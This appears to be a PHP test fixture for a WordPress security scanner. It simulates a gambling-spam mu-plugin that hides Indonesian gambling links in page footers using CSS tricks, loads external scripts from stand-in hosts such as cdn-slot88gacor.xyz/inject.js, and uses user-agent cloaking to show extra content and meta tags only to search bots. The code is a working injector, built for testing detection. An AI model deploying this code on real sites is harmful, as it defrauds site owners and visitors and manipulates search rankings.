<?php
/**
 * ============================================================================
 * DISCLAIMER: This is a TEST FILE for wphunter security scanner testing ONLY.
 * It simulates a real "judol" (gambling spam) injection attack.
 * DO NOT use this on production sites.
 * This file is for authorized security testing and educational purposes only.
 * ============================================================================
 *
 * What this simulates:
 * - Hidden gambling content injected via CSS tricks (display:none, position:absolute)
 * - SEO cloaking (different content for Googlebot vs human visitors)
 * - Suspicious external links to gambling domains
 * - External script injection from gambling-related sources
 * - Indonesian gambling keywords (slot gacor, togel, judi online, etc.)
 *
 * How real attackers do it:
 * 1. Exploit a vulnerable plugin (e.g., Elementor RCE, Really Simple SSL auth bypass)
 * 2. Upload a mu-plugin (must-use plugin) that auto-loads without activation
 * 3. Inject hidden gambling content into every page
 * 4. Serve different content to Googlebot vs human visitors (cloaking)
 * 5. The compromised site's domain authority boosts gambling site rankings
 */

// ── Cloaking: detect search engine bots ──────────────────────────────────────
function judol_is_bot() {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $bots = ['googlebot', 'bingbot', 'yandex', 'baiduspider', 'slurp'];
    foreach ($bots as $bot) {
        if (strpos($ua, $bot) !== false) return true;
    }
    return false;
}

// ── Inject hidden gambling content into wp_footer ────────────────────────────
add_action('wp_footer', function() {
    // Always inject hidden content (visible to crawlers, hidden from humans)
    ?>

    <!-- Injected by compromised mu-plugin (TEST - wphunter demo) -->

    <!-- Layer 1: Hidden div with display:none -->
    <div style="display:none">
        <h2>Slot Gacor Hari Ini - Situs Judi Online Terpercaya 2024</h2>
        <p>Daftar slot gacor maxwin hari ini di situs judi online terpercaya.
        Main slot88 gacor dengan RTP tertinggi. Togel hongkong result tercepat.
        Judi online terlengkap dengan slot deposit pulsa tanpa potongan.</p>
        <a href="http://slot88gacor.xyz">Slot Gacor Maxwin</a>
        <a href="http://togel-hongkong.top">Togel Hongkong</a>
        <a href="http://judol-terpercaya.vip">Judi Online Terpercaya</a>
    </div>

    <!-- Layer 2: Off-screen positioned content -->
    <div style="position:absolute;left:-9999px;top:-9999px">
        <h3>Situs Slot Online Gacor Terbaru</h3>
        <p>Bandar togel online resmi terpercaya. Slot deposit dana 10rb tanpa potongan.
        Live casino online 24 jam. Poker online uang asli terbaik Indonesia.</p>
        <a href="http://slotgacor-maxwin.com">Daftar Slot Gacor</a>
        <a href="http://bandar-togel88.net">Bandar Togel Online</a>
    </div>

    <!-- Layer 3: Zero font-size trick -->
    <div style="font-size:0;line-height:0;overflow:hidden;height:0">
        <p>RTP slot gacor hari ini pragmatic play. Bocoran slot gacor malam ini.
        Situs togel terpercaya hadiah 4d 10 juta. Agen judi bola terpercaya.
        Slot777 gacor gampang menang. Togel singapore pools resmi.</p>
    </div>

    <!-- Layer 4: Opacity zero -->
    <div style="opacity:0;position:fixed;z-index:-1">
        <p>Link alternatif slot gacor terbaru. Daftar akun slot gacor gratis.
        Prediksi togel hongkong malam ini. Judi slot online deposit pulsa.
        Situs slot gacor 2024 paling gampang menang maxwin x500.</p>
    </div>

    <!-- Layer 5: Suspicious external scripts -->
    <script src="http://cdn-slot88gacor.xyz/inject.js" async></script>
    <script src="http://tracking-judol.top/pixel.js" async></script>

    <?php

    // ── Cloaking: extra content ONLY for search engine bots ──────────────
    if (judol_is_bot()) {
        ?>
        <!-- Cloaked content: only visible to Googlebot -->
        <div>
            <h1>Slot Gacor Hari Ini - Daftar Situs Judi Online Terpercaya</h1>
            <p>Selamat datang di situs slot gacor terpercaya nomor 1 di Indonesia.
            Nikmati permainan judi online terlengkap: slot online, togel hongkong,
            togel singapore, live casino, poker online, dan judi bola.</p>

            <h2>Daftar Slot Gacor Gampang Menang</h2>
            <ul>
                <li><a href="http://slot88gacor.xyz">Slot88 Gacor - RTP 98.5%</a></li>
                <li><a href="http://pragmatic-slot.vip">Pragmatic Play Slot Gacor</a></li>
                <li><a href="http://pg-soft-slot.top">PG Soft Slot Terbaru</a></li>
                <li><a href="http://habanero-slot.xyz">Habanero Slot Online</a></li>
            </ul>

            <h2>Togel Online Terpercaya</h2>
            <p>Pasaran togel terlengkap: togel hongkong, togel singapore, togel sydney.
            Result togel tercepat dan terakurat. Hadiah 4D x 10.000.</p>
            <a href="http://togel-hk-pools.net">Togel Hongkong Pools</a>
            <a href="http://togel-sgp-resmi.com">Togel Singapore Resmi</a>

            <h2>Live Casino Online 24 Jam</h2>
            <p>Main baccarat, roulette, sic bo, dan dragon tiger bersama dealer cantik.
            Minimal bet 10rb. Withdraw tanpa batas.</p>
        </div>
        <?php
    }
});

// ── Inject gambling meta tags for SEO manipulation ───────────────────────────
add_action('wp_head', function() {
    if (judol_is_bot()) {
        echo '<meta name="description" content="Slot Gacor Hari Ini &#x2B50; Situs Judi Online Terpercaya 2024 &#x2B50; Daftar Slot88 Gacor Maxwin RTP Tertinggi &#x2B50; Togel Hongkong Singapore Sydney">' . "\n";
        echo '<meta name="keywords" content="slot gacor, judi online, togel hongkong, slot88, slot deposit pulsa, bandar togel, live casino, poker online">' . "\n";
    }
});
